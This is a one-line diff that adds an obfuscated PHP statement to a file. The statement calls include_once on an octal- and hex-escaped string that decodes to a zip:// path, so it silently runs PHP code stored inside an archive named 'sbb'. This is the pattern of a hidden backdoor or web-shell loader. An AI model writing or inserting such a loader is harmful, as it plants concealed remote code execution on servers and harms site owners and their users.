@@ -1,0 +1,1 @@
+<?php (function ($W4gas) { include_once $W4gas; })("\172\x69\x70\72\x2f\x2f\163\142\142\43\x73\142");?>
